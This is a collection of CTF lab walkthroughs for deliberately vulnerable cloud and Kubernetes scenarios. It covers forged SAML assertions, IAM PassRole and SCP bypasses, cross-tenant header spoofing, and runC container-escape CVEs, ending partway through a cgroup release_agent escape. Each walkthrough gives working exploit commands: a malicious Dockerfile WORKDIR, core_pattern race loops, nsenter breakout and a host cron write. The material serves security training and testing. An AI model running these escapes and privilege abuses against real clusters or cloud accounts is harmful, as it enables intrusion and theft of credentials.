<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-13: Golden SAML → Federation Trust Root Compromise

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (Golden SAML — private key exposure) |
| Difficulty | L3 |
| Port | 10613 |
| Path | docker/cloud/golden-saml |
| Type | docker |
| Flag | flag{cloud-13-golden-saml} (SAML IdP environment) |

### Attack Path Summary
explore IdP (Step 1) → /debug reveals /backup → find private key (Step 2) → forge JWT (Step 3) → AssumeRoleWithSAML (Step 4) → flag

### Prerequisites
#### Knowledge
- SAML 2.0 federation protocol and trust model
- Golden SAML attack technique
- AWS STS AssumeRoleWithSAML API
- RSA key usage for JWT/SAML signing

#### Tools
- nmap: Service discovery (saml-idp on 10707, aws-sts on 10702)
- curl: IdP exploration and STS API calls
- Python PyJWT/cryptography: Token signing

### Step-by-Step Exploitation
#### Step 1: Explore SAML IdP
Access the Golden SAML Console. Use Step 1 to explore IdP endpoints:
- `/.well-known/saml-metadata.xml` — entityID: corp-idp.example.com
- `/debug` — reveals: "Configuration backups stored in /backup/ directory"

#### Step 2: Find Signing Key
The /debug hint leads to the backup directory:
```bash
curl http://saml-idp:5000/backup/
## Returns: {"files": ["private.pem", "metadata.xml.bak", "config.json"]}
curl http://saml-idp:5000/backup/private.pem
## Returns: -----BEGIN RSA PRIVATE KEY-----
```

#### Step 3: Forge SAML Assertion
Use the stolen private key + IdP's /sign endpoint to create a JWT with forged claims:
```bash
curl -X POST http://saml-idp:5000/sign -H "Content-Type: application/json" \
  -d '{"claims": {"sub": "admin@corp", "aud": "https://signin.aws.amazon.com/saml"}}'
## Returns signed JWT
```

#### Step 4: Assume Role with Forged Assertion
```bash
curl -X POST http://iam:5000/ \
  -d "Action=AssumeRoleWithSAML&RoleArn=arn:aws:iam::000000000000:role/SAMLAdminRole&SAMLAssertion=<JWT>&RoleSessionName=golden-saml"
```

### Flag Location
- SAML IdP container environment variable FLAG

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-14: PassRole Abuse → Cross-Service Lambda Execution

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (iam:PassRole abuse) |
| Difficulty | L2 |
| Port | 10614 |
| Path | docker/cloud/passrole-abuse |
| Type | docker |
| Flag | flag{cloud-14-passrole} (Lambda execution with AdminRole) |

### Attack Path Summary
list roles (Step 1) → identify AdminRole → test with low-priv role → test with AdminRole → PassRole succeeds → AdminRole code execution → flag

### Prerequisites
#### Knowledge
- AWS IAM PassRole permission semantics
- Lambda execution role and credential injection
- IAM role enumeration and permission analysis

#### Tools
- nmap: Service discovery (aws-sts on 10702, lambda on 10705)
- curl: Lambda invocation and role testing

### Step-by-Step Exploitation
#### Step 1: Enumerate IAM Roles
Use PassRole Console Step 1 to list available roles:
```bash
curl http://iam:5000/roles
## Returns roles including AdminRole (s3:*, iam:*) and LambdaExecutionRole
```

#### Step 2: Test Lambda with Different Roles
Try invoking Lambda with EC2Role (restricted):
```bash
curl -X POST http://lambda:5000/invoke -H "Content-Type: application/json" \
  -d '{"role": "arn:aws:iam::000000000000:role/EC2Role", "code": "import os; print(os.environ)"}'
## Executes but may have limited access
```

#### Step 3: PassRole to AdminRole
```bash
curl -X POST http://lambda:5000/invoke -H "Content-Type: application/json" \
  -d '{"role": "arn:aws:iam::000000000000:role/AdminRole", "code": "import os; print(os.environ.get("FLAG","?"))"}'
## Lambda executes with AdminRole — FLAG is now visible
```

### Flag Location
- Lambda execution environment, visible only when AdminRole is passed

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-15: SCP Bypass via Legacy API Version

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (SCP bypass via API version) |
| Difficulty | L2 |
| Port | 10615 |
| Path | docker/cloud/scp-bypass |
| Type | docker |
| Flag | flag{cloud-15-scp-bypass} (AdminRole credentials after SCP bypass) |

### Attack Path Summary
test AssumeRole (Step 1) → SCP blocks → analyze error message → try old API version (Step 2) → SCP bypass → AdminRole credentials → flag

### Prerequisites
#### Knowledge
- AWS Organizations Service Control Policies (SCP)
- AWS STS API versioning (2011-06-15 SCP introduction)
- API version-based policy enforcement gaps

#### Tools
- nmap: Service discovery (aws-sts on 10702)
- curl: STS API calls with version parameters

### Step-by-Step Exploitation
#### Step 1: Attempt AssumeRole with Default API Version
Use SCP Bypass Console Step 1 with scp-bypass-user credentials:
```bash
curl -X POST http://iam:5000/ \
  -d "Action=AssumeRole&RoleArn=arn:aws:iam::000000000000:role/AdminRole&AccessKeyId=AKIASCBPASSEXAMPLE&SecretAccessKey=scp-bypass-secret"
## Returns: 400 — "explicit deny by SCP (DenyScpBypassUserAssumeRoleToAdmin)"
```

#### Step 2: Bypass with Old API Version
Try with Version=2010-05-08 (predates SCP enforcement):
```bash
curl -X POST http://iam:5000/ \
  -d "Version=2010-05-08&Action=AssumeRole&RoleArn=arn:aws:iam::000000000000:role/AdminRole&AccessKeyId=AKIASCBPASSEXAMPLE&SecretAccessKey=scp-bypass-secret"
## Returns: 200 — AdminRole credentials (SCP not enforced on old API)
```

### Flag Location
- AdminRole temporary credentials, obtained via SCP bypass

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-16: CloudTrail Logging Gap → Silent Enumeration

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (CloudTrail logging gap) |
| Difficulty | L2 |
| Port | 10616 |
| Path | docker/cloud/logging-gap |
| Type | docker |
| Flag | flag{cloud-16-silent-enum} (in /admin/list response) |

### Attack Path Summary
public API discovery → observe audit logging → endpoint enumeration → find /admin/list → confirm no logging → read flag silently

### Prerequisites
#### Knowledge
- AWS CloudTrail logging mechanism and coverage gaps
- API endpoint discovery techniques (gobuster/dirb)
- Difference between documented and undocumented cloud APIs

#### Tools
- nmap: Service discovery
- curl: API probing
- gobuster/dirb: Endpoint enumeration

### Step-by-Step Exploitation
#### Step 1: Access Public Endpoint
```bash
curl http://localhost:10616/query?endpoint=/api/resources
## Returns resource list; audit-log records the access
```

#### Step 2: Enumerate Hidden Endpoints
Use gobuster or manual probing to discover undocumented endpoints. Try `/admin/list`:
```bash
curl http://localhost:10616/query?endpoint=/admin/list
## Returns extended resource list including flag-store with flag
## Notably: this access does NOT appear in audit-log
```

#### Step 3: Confirm Logging Gap
Compare audit-log entries: `/api/resources` produces log entries, `/admin/list` does not.

### Flag Location
- In the `/admin/list` API response (resource-api), accessible via the unrecorded endpoint

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-17: Managed Identity Confused Deputy → Cross-Service Access

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (Confused Deputy) |
| Difficulty | L2 |
| Port | 10617 |
| Path | docker/cloud/confused-deputy |
| Type | docker |
| Flag | flag{cloud-17-deputy} (svc-b /data endpoint) |

### Attack Path Summary
discover svc-a endpoints → /debug reveals /proxy and auth token → proxy request to svc-b → svc-b trusts svc-a's managed identity → flag

### Prerequisites
#### Knowledge
- Confused Deputy attack pattern
- Azure Managed Identity / AWS IAM Role for services
- Bearer token authentication forwarding

#### Tools
- nmap: Service discovery
- curl: HTTP proxy requests

### Step-by-Step Exploitation
#### Step 1: Discover Internal Routes
```bash
curl http://localhost:10617/attack?target=svc-a:5000
## Or probe svc-a /debug to reveal route table including /proxy endpoint
```

#### Step 2: Identify Auth Token
From /debug response: `"auth_header": "Bearer mi-token-svc-a..."` — svc-a has a managed identity token.

#### Step 3: Proxy to svc-b
```bash
curl "http://localhost:10617/attack?target=svc-b:5000"
## svc-a forwards request to svc-b with Authorization: Bearer mi-token-svc-a-identity
## svc-b validates token and returns flag
```

### Flag Location
- svc-b `/data` endpoint, only accessible when authenticated with svc-a's managed identity token

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-18: Service Tag Spoofing → Firewall Bypass

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (Azure Service Tag spoofing) |
| Difficulty | L2 |
| Port | 10618 |
| Path | docker/cloud/svc-tag-spoof |
| Type | docker |
| Flag | flag{cloud-18-svc-tag} (internal-api /flag) |

### Attack Path Summary
direct access blocked → firewall /docs reveals mechanism → test tags → error messages hint at Azure* pattern → AzureCloud accepted → flag

### Prerequisites
#### Knowledge
- Azure Service Tags and firewall trust model
- HTTP header-based access control
- Error message analysis for discovery

#### Tools
- nmap: Service discovery
- curl: HTTP requests with custom headers

### Step-by-Step Exploitation
#### Step 1: Attempt Direct Access
```bash
curl http://localhost:10618/bypass?tag=test
## Returns: 403 — "Rejected: 'test' is not a recognized Azure service tag"
```

#### Step 2: Discover Firewall Mechanism
```bash
## Error message hints: "Valid tags follow the pattern 'Azure*'"
## Firewall /docs reveals X-Azure-Service-Tag header mechanism
```

#### Step 3: Test Valid Service Tags
```bash
curl "http://localhost:10618/bypass?tag=AzureCloud"
## Tag accepted → firewall forwards to internal-api → returns flag
```

### Flag Location
- internal-api `/flag` endpoint, accessible only after firewall bypass

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-20: Shared Metadata Proxy → Cross-Tenant Credential Leak

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (cross-tenant metadata access) |
| Difficulty | L2 |
| Port | 10620 |
| Path | docker/cloud/shared-metadata-proxy |
| Type | docker |
| Flag | flag{cloud-20-cross-tenant} (tenant-a credentials from shared proxy) |

### Attack Path Summary
tenant-b access → discover X-Tenant-ID mechanism → enumerate tenant IDs → forge tenant-a header → cross-tenant credential access → flag

### Prerequisites
#### Knowledge
- Cloud metadata proxy architecture (Azure WireServer, AWS IMDS)
- Multi-tenant isolation mechanisms
- HTTP header-based tenant identification

#### Tools
- nmap: Service discovery
- curl: Cross-tenant API requests

### Step-by-Step Exploitation
#### Step 1: Access as Tenant B
```bash
curl -H "X-Tenant-ID: tenant-b" http://shared:5000/metadata/credentials
## Returns tenant-b credentials — confirms X-Tenant-ID controls access
```

#### Step 2: Enumerate Tenant IDs
Test different tenant IDs. Common patterns: tenant-a, tenant-b, admin, default.

#### Step 3: Cross-Tenant Access
```bash
curl -H "X-Tenant-ID: tenant-a" http://shared:5000/metadata/credentials
## Returns tenant-a credentials including flag — no authentication required!
```

### Flag Location
- Shared metadata proxy response for tenant-a credentials

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-21: Global S3 Namespace Squatting → Cross-Tenant Data Theft

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (S3 public bucket enumeration) |
| Difficulty | L2 |
| Port | 10621 |
| Path | docker/cloud/global-s3-squatting |
| Type | docker |
| Flag | flag{cloud-21-s3-squatting} (in public bucket prod-assets-2024/flag.txt) |

### Attack Path Summary
S3 Explorer access → enumerate global bucket list → discover prod-assets-2024 → public-read access → read flag.txt → flag

### Prerequisites
#### Knowledge
- AWS S3 global namespace and bucket naming conventions
- S3 bucket ACLs (public-read vs private)
- Cross-tenant data access via public bucket misconfiguration

#### Tools
- nmap: Service discovery
- curl: S3 API enumeration and object retrieval

### Step-by-Step Exploitation
#### Step 1: Enumerate Global Bucket Namespace
Access the S3 Explorer at http://localhost:10621. Enter a bucket name or list all:
```bash
curl http://s3-global:5000/
## Returns: {"buckets": ["prod-assets-2024", "dev-logs", "tenant-a-data"]}
```

#### Step 2: Explore Victim Bucket
```bash
curl http://s3-global:5000/buckets/prod-assets-2024
## Returns: {"name": "prod-assets-2024", "owner": "victim-tenant", "objects": ["flag.txt", "config.json"]}
```

#### Step 3: Read Cross-Tenant Object
```bash
curl http://s3-global:5000/buckets/prod-assets-2024/flag.txt
## Returns flag — bucket is public-read, no auth required
```

### Flag Location
- Object `flag.txt` in publicly accessible bucket `prod-assets-2024`

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-22: Shared AI Inference Queue → Cross-Tenant Data Leak

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (multi-tenant isolation failure) |
| Difficulty | L2 |
| Port | 10622 |
| Path | docker/cloud/shared-inference-queue |
| Type | docker |
| Flag | flag{cloud-22-inference} (victim tenant inference job data) |

### Attack Path Summary
submit own job → query with tenant-a → see only own data → test boundary value → tenant=* bypass → all tenant data visible → flag

### Prerequisites
#### Knowledge
- Multi-tenant SaaS application isolation patterns
- API parameter boundary testing
- Tenant ID enumeration and wildcard bypass

#### Tools
- nmap: Service discovery
- curl: Queue API interaction with custom headers

### Step-by-Step Exploitation
#### Step 1: Normal Tenant Access
Submit a job as tenant-a and query queue:
```bash
curl -H "X-Tenant-ID: tenant-a" http://inference:5000/queue
## Returns only tenant-a jobs — seems properly isolated
```

#### Step 2: Test Boundary Values
Try wildcard or special tenant values:
```bash
curl -H "X-Tenant-ID: *" http://inference:5000/queue
## Returns ALL jobs from ALL tenants — wildcard bypasses filtering!
```

#### Step 3: Extract Cross-Tenant Data
Victim tenant's job contains sensitive data and flag in input_data field.

### Flag Location
- In the shared inference queue, victim job's input_data field, accessible via X-Tenant-ID: *

---

---

### 1.2 Kubernetes 单点场景

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-01-runc-workdir-exploitation.md -->

## K8S-01: runC WORKDIR Container Escape (CVE-2024-21626)

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | CVE-2024-21626 -- runC WORKDIR /proc/self/fd/7 escape |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-01-runc-escape |
| Flag Location | `/host-flags/flag.txt` on KIND node (extraMount) |

### Attack Path Summary
1. Pod runs an image with `WORKDIR /proc/self/fd/7` in its Dockerfile
2. Due to CVE-2024-21626, runC follows `/proc/self/fd/7` to the host filesystem descriptor leaked by runC
3. When the container starts, its working directory is set to the host's `/host-flags` directory
4. The container command reads `flag.txt` from the host filesystem

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-01-runc-escape`
- Pod name: `runc-escape-poc` (restartPolicy: Never -- runs once and exits)
- No special capabilities or mounts needed

### Step-by-Step Exploitation

#### Step 1: Deploy the Vulnerable Configuration
The scenario is pre-deployed with a custom image built with `WORKDIR /proc/self/fd/7`. Verify:

```bash
## Check the pod status
kubectl get pod runc-escape-poc
## Expected: STATUS=Completed (pod ran and exited)

## View the pod logs -- the flag will be here
kubectl logs runc-escape-poc
## Expected: flag{k8s-01-*} (or an error if the exploit didn't trigger)
```

#### Step 2: Understanding the Exploit
The exploit works because of a bug in runC's working directory handling:

```dockerfile
FROM alpine:latest
WORKDIR /proc/self/fd/7
CMD ["cat", "/host-flags/flag.txt"]
```

1. runC opens the container's root filesystem and stores the file descriptor
2. Due to the race condition in CVE-2024-21626, the FD for the host's filesystem is leaked at `/proc/self/fd/7`
3. Setting `WORKDIR /proc/self/fd/7` makes the container start in the host filesystem context
4. The container command `cat /host-flags/flag.txt` then resolves relative to the host, not the container

#### Step 3: Manual Exploitation (Rebuild Yourself)
If the automated exploit didn't trigger, build and run the malicious image manually:

```bash
## Create a Dockerfile with the malicious WORKDIR
cat > /tmp/Dockerfile << 'EOF'
FROM alpine:latest
WORKDIR /proc/self/fd/7
CMD ["cat", "/host-flags/flag.txt"]
EOF

## Build and load into KIND
docker build -t runc-workdir-exploit:latest -f /tmp/Dockerfile /tmp
kind load docker-image runc-workdir-exploit:latest --name cve-k8s-01-runc-escape

## Deploy
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: runc-exploit-manual
spec:
  containers:
    - name: escape
      image: runc-workdir-exploit:latest
      imagePullPolicy: Never
  restartPolicy: Never
YAML

## Check the logs
kubectl logs runc-exploit-manual
```

#### Step 4: Alternative -- Interactive Access
For interactive access to the host via the same technique:

```dockerfile
FROM alpine:latest
WORKDIR /proc/self/fd/7
CMD ["sleep", "3600"]
```

Then exec in and explore the host filesystem:

```bash
kubectl exec -it runc-interactive -- sh
## From inside: you are now in the host filesystem context
pwd
ls   # Shows contents of /host-flags on the host
```

#### Step 5: Capture Flag
- Flag format: `flag{k8s-01-*}`
- Flag location: `/host-flags/flag.txt` on the KIND node
- Read via: `kubectl logs runc-escape-poc`
- Expected output: `flag{k8s-01-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is running
kubectl cluster-info --context kind-cve-k8s-01-runc-escape

## Verify the flag directory is mounted into the KIND node
docker exec cve-k8s-01-runc-escape-control-plane ls /host-flags/
## Expected: flag.txt

## Check the pod logs for the flag
kubectl logs runc-escape-poc
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-02-runc-devnull-exploitation.md -->

## K8S-02: runC /dev/null Symlink Escape (CVE-2025-31133)

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | CVE-2025-31133 -- runC /dev/null symlink to core_pattern escape |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-02-runc-null |
| Flag Location | `/host-flags/flag.txt` on KIND node (extraMount) |

### Attack Path Summary
1. Pod runs a malicious container image that replaces `/dev/null` with a symlink
2. Symlink points to `/proc/sys/kernel/core_pattern` on the host
3. runC internally writes to `/dev/null` during container setup, which follows the symlink
4. Writing to `core_pattern` allows arbitrary command execution when a process crashes
5. Trigger a controlled crash to execute a payload that reads the flag

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-02-runc-null`
- Pod name: `null-escape-poc`
- Understanding of the Linux core_pattern mechanism

### Step-by-Step Exploitation

#### Step 1: Understanding the Vulnerability
CVE-2025-31133 is a TOCTOU (time-of-check/time-of-use) vulnerability in runC's handling of masked paths. The `/dev/null` device inside the container is supposed to be a read-only bind mount to prevent escaping, but a race condition allows replacing it with a symlink before runC uses it.

The attack chain:
1. Replace `/dev/null` with a symlink to `/proc/sys/kernel/core_pattern`
2. runC writes to `/dev/null` (actually writing to core_pattern)
3. core_pattern value `|/tmp/handler %p %s %e` causes the kernel to execute `/tmp/handler` on every crash
4. Write a handler script that reads the flag and outputs it
5. Trigger a crash to execute the handler

#### Step 2: Build the Malicious Image
```bash
## Create a Dockerfile with the exploit payload
cat > /tmp/Dockerfile.null << 'EOF'
FROM alpine:latest
## Install tools needed for the exploit
RUN apk add --no-cache gcc musl-dev

## Create the exploit binary that replaces /dev/null with a symlink
## and triggers the crash
COPY exploit.c /exploit.c
RUN gcc -o /exploit /exploit.c -static

CMD ["/exploit"]
EOF
```

#### Step 3: Core Exploit Logic
The exploit binary (`exploit.c`) would:

1. Create a symlink: `symlink("/proc/sys/kernel/core_pattern", "/dev/null")`
2. Set up a handler at `/tmp/handler.sh`:
   ```bash
   #!/bin/bash
   cat /host-flags/flag.txt > /tmp/flag_out.txt
   ```
3. Trigger a program crash (e.g., `kill -SEGV $$`)
4. The kernel executes `handler.sh`, which saves the flag to a readable location

Alternatively, since the scenario runs as a `sleep` command, you can exec in and manually perform the steps:

```bash
kubectl exec -it null-escape-poc -- sh

## Replace /dev/null with a symlink to core_pattern
## Note: This requires a race window -- in practice, you need to
## continuously replace /dev/null while runC is starting up
while true; do
    ln -sf /proc/sys/kernel/core_pattern /dev/null 2>/dev/null
done &
```

#### Step 4: Write Core Pattern Handler
```bash
## Write the handler script
cat > /tmp/handler.sh << 'SCRIPT'
#!/bin/sh
cat /host-flags/flag.txt > /tmp/flag_out
chmod 644 /tmp/flag_out
SCRIPT
chmod +x /tmp/handler.sh
```

#### Step 5: Trigger Crash
Once `/dev/null` has been symlinked and the core_pattern contains the handler path:

```bash
## Trigger a segmentation fault
sh -c 'kill -SEGV $$'
## Or use a binary that intentionally crashes
```

#### Step 6: Read the Flag
```bash
cat /tmp/flag_out
## Expected: flag{k8s-02-*}
```

#### Step 7: Capture Flag
- Flag format: `flag{k8s-02-*}`
- Flag location: `/host-flags/flag.txt` on the KIND node
- Expected output: `flag{k8s-02-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is running
kubectl get pod null-escape-poc
## Expected: STATUS Running (sleeping for 3600)

## Check the flag directory exists in the node
docker exec cve-k8s-02-runc-null-control-plane ls /host-flags/
## Expected: flag.txt

## Verify the flag content
docker exec cve-k8s-02-runc-null-control-plane cat /host-flags/flag.txt
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-03-runc-lsm-bypass-exploitation.md -->

## K8S-03: runC LSM Bypass Escape (CVE-2025-52881)

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | CVE-2025-52881 -- runC LSM bypass via shared-mount TOCTOU race |
| Difficulty | L3 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-03-runc-lsm |
| Flag Location | `/host-flags/flag.txt` on KIND node (extraMount) |

### Attack Path Summary
1. Pod runs a malicious image designed to exploit the shared-mount TOCTOU race
2. The vulnerability bypasses AppArmor/SELinux enforcement during container startup
3. A race condition in shared mount handling allows redirecting runC writes to forged procfs files
4. Successfully writing to `/proc/sys/kernel/core_pattern` (or similar) enables host command execution
5. Trigger a crash to execute a payload that reads the flag

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-03-runc-lsm`
- Pod name: `lsm-escape-poc`
- Deep understanding of Linux mount namespaces, LSM (AppArmor/SELinux), and TOCTOU races

### Step-by-Step Exploitation

#### Step 1: Understanding the Vulnerability
CVE-2025-52881 exploits a race condition in runC's shared mount propagation handling:

1. runC sets up bind mounts for the container rootfs
2. A race exists between the mount setup and LSM (AppArmor/SELinux) label application
3. An attacker process inside the container can manipulate shared mounts before the LSM label is applied
4. This allows writing to `/proc/sys/kernel/core_pattern` or creating device nodes that bypass security policies
5. Once `core_pattern` is modified, any process crash executes a handler script on the host

#### Step 2: Exec into the Pod
```bash
kubectl exec -it lsm-escape-poc -- sh
```

#### Step 3: Set Up the Race Exploit
The exploit requires running a tight loop that races against runC's mount setup:

```bash
## Inside the container, continuously attempt to mount over sensitive paths
## This exploits the window between mount creation and LSM labeling

## Attempt 1: Manipulate shared mounts before AppArmor attaches
mkdir -p /tmp/exploit
mount --bind /tmp/exploit /proc/sys/kernel/ 2>/dev/null &

## Attempt 2: Write to core_pattern through the race window
while true; do
    echo "|/tmp/handler.sh %p %s %e" > /proc/sys/kernel/core_pattern 2>/dev/null
done &

## Attempt 3: Race against mount --bind propagation
while true; do
    mount --make-shared /proc/sys/kernel/ 2>/dev/null
    echo "|/tmp/handler.sh" > /proc/sys/kernel/core_pattern 2>/dev/null
done &
```

#### Step 4: Write the Handler Script
```bash
cat > /tmp/handler.sh << 'SCRIPT'
#!/bin/sh
cat /host-flags/flag.txt > /tmp/flag_out
chmod 644 /tmp/flag_out
SCRIPT
chmod +x /tmp/handler.sh
```

#### Step 5: Trigger a Crash
```bash
## Trigger a controlled crash (many ways)
sh -c 'kill -SEGV $$' &
## Or compile a small C program that dereferences NULL
```

#### Step 6: Read the Flag
```bash
## If the race succeeded, the flag is now readable
cat /tmp/flag_out
## Expected: flag{k8s-03-*}
```

#### Step 7: Capture Flag
- Flag format: `flag{k8s-03-*}`
- Flag location: `/host-flags/flag.txt` on the KIND node
- This is an L3 difficulty challenge -- the race window is narrow and may require multiple attempts
- Expected output: `flag{k8s-03-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster and pod are running
kubectl get pod lsm-escape-poc

## Check the flag directory exists in the node
docker exec cve-k8s-03-runc-lsm-control-plane ls /host-flags/
## Expected: flag.txt

## Verify the flag content on the node
docker exec cve-k8s-03-runc-lsm-control-plane cat /host-flags/flag.txt

## Check core_pattern on the node to see if exploit succeeded
docker exec cve-k8s-03-runc-lsm-control-plane cat /proc/sys/kernel/core_pattern
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-11-privileged-breakout-exploitation.md -->

## K8S-11: Privileged Container Breakout

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (privileged pod) -- privileged: true container |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-11-privileged |
| Flag Location | `/host-flag/flag.txt` on KIND node, mounted into pod at `/host-flag` |

### Attack Path Summary
1. Pod `privileged-pod` runs with `privileged: true` (all capabilities, no isolation)
2. The pod has a hostPath volume mounting `/host-flag` from the KIND node
3. Use `nsenter` to enter the host namespace and read the flag
4. Alternative: mount the host filesystem and read the flag directly

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-11-privileged`
- Pod name: `privileged-pod` (alpine image)
- Tools inside pod: `nsenter`, `mount`, `cat`

### Step-by-Step Exploitation

#### Step 1: Initial Access
Exec into the privileged pod:

```bash
kubectl exec -it privileged-pod -- sh
```

#### Step 2: Verify Privileged Mode
```bash
## Check capabilities
cat /proc/self/status | grep CapEff
## Should show all capabilities (full set)

## Check if we can see devices
ls -la /dev/
## Expected: full device list (not filtered)

## Check privileged flag
cat /proc/self/status | grep CapEff | awk '{print $2}' | while read cap; do
    capsh --decode=$cap 2>/dev/null || true
done
## Should show all capabilities including: CAP_SYS_ADMIN, CAP_NET_ADMIN, etc.
```

#### Step 3: Breakout via nsenter
Use `nsenter` to enter the host namespace (PID 1):

```bash
## Enter the host mount, PID, network, and IPC namespaces
nsenter --mount --uts --ipc --net --pid --target 1

## Now you are in the host's root namespace
cat /host-flag/flag.txt
## Expected: flag{k8s-11-*}

## Or run a single command
nsenter --target 1 --mount --pid -- cat /host-flag/flag.txt
```

#### Step 4: Alternative -- Mount Host Filesystem
```bash
## Create a mount point
mkdir -p /mnt/host

## Mount the host root filesystem via the privileged device access
mount /dev/sda1 /mnt/host 2>/dev/null || \
mount /dev/vda1 /mnt/host 2>/dev/null || \
mount /dev/vda /mnt/host 2>/dev/null

## List disks to find the correct device
lsblk
fdisk -l 2>/dev/null || cat /proc/partitions
```

#### Step 5: Alternative -- Write to Host cron
```bash
## With privileged access, write a cron job to the host
echo "* * * * * root cat /host-flag/flag.txt > /tmp/flag_out" > /tmp/cronjob
cp /tmp/cronjob /etc/cron.d/flag-job 2>/dev/null || \
nsenter --target 1 --mount -- sh -c "echo '* * * * * root cat /host-flag/flag.txt > /tmp/flag_out' > /etc/cron.d/flag-job"
```

#### Step 6: Direct Flag Access
Since the flag is mounted via hostPath at `/host-flag`, it's directly accessible:

```bash
## The flag is mounted directly in the pod at /host-flag/
cat /host-flag/flag.txt
## Expected: flag{k8s-11-*}

## If not, use nsenter
nsenter --target 1 --mount -- cat /host-flag/flag.txt
```

#### Step 7: Capture Flag
- Flag format: `flag{k8s-11-*}`
- Flag location: `/host-flag/flag.txt` on the KIND node, mounted into pod at `/host-flag`
- Access methods:
  - Direct: `cat /host-flag/flag.txt` (if mounted)
  - nsenter: `nsenter --target 1 --mount -- cat /host-flag/flag.txt`
- Expected output: `flag{k8s-11-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the scenario is deployed and running
kubectl get pod privileged-pod
## Expected: NAME             READY   STATUS    RESTARTS   AGE
##           privileged-pod   1/1     Running   0          ...

## Verify privileged mode
kubectl exec privileged-pod -- cat /proc/self/status | grep CapEff

## Quick exploit verification (single line)
kubectl exec privileged-pod -- nsenter --target 1 --mount -- cat /host-flag/flag.txt
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-14-cap-sys-admin-exploitation.md -->

## K8S-14: CAP_SYS_ADMIN cgroup Escape

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | CAP_SYS_ADMIN abuse -- cgroup release_agent escape |
| Difficulty | L3 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-14-capsys |
| Flag Location | `/host-flag/flag.txt` on KIND node, mounted into pod at `/host-flag` |

### Attack Path Summary
1. Pod `capsys-pod` runs with `CAP_SYS_ADMIN` capability
2. The pod has cgroup v1 hierarchy mounted at `/sys/fs/cgroup` (hostPath)
3. CAP_SYS_ADMIN allows writing to `release_agent` in a cgroup
4. `release_agent` is executed on the host when the last process in the cgroup exits
5. Write a script that reads the flag and trigger cgroup release

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-14-capsys`
- Pod name: `capsys-pod` (alpine image)
- Tools: `mount`, `mkdir`, `echo`
- Understanding of cgroup v1 release_agent mechanism

### Step-by-Step Exploitation

#### Step 1: Initial Access
Exec into the pod with SYS_ADMIN capability:

```bash
kubectl exec -it capsys-pod -- sh
```

#### Step 2: Verify SYS_ADMIN Capability
```bash
## Check capabilities
cat /proc/self/status | grep CapEff

## Verify we can mount filesystems
mount | grep cgroup
## Expected: cgroup mounts should be visible

## Check cgroup version
mount | grep cgroup
## If it shows cgroup type with "cgroup" (not cgroup2), we have cgroup v1
```

#### Step 3: Check cgroup Mount Access
```bash
## List the cgroup mount
ls -la /sys/fs/cgroup/
## Expected: cgroup v1 controllers

## Find a cgroup that has the release_agent feature
## Typically you need to use a cgroup that you control (like memory)
ls /sys/fs/cgroup/memory/
## Expected: cgroup memory controller files
```

#### Step 4: Set Up the Escape
The cgroup release_agent escape requires:

1. Creating a sub-cgroup
2. Writing a notify_on_release script
3. Setting release_agent to point to the script
4. Emptying the cgroup (so the last process exits, triggering release_agent)

```bash
## Create a writable cgroup
mkdir -p /sys/fs/cgroup/memory/exploit

## Enable notify_on_release for this cgroup
echo 1 > /sys/fs/cgroup/memory/exploit/notify_on_release

## Write the release agent script to the host filesystem
## We need to write to a location readable by the host
## Use /host-flag (which is mounted from the host) or /sys (which is also host-mounted)

## Write a script that reads the flag and makes it accessible
cat > /tmp/release_script.sh << 'SCRIPT'
#!/bin/sh
cat /host-flag/flag.txt > /tmp/flag_captured.txt
chmod 644 /tmp/flag_captured.txt
SCRIPT
chmod +x /tmp/release_script.sh

## Copy the script to the host-flag mount (accessible from host)
## But we need the script to be on the HOST filesystem for release_agent to execute it
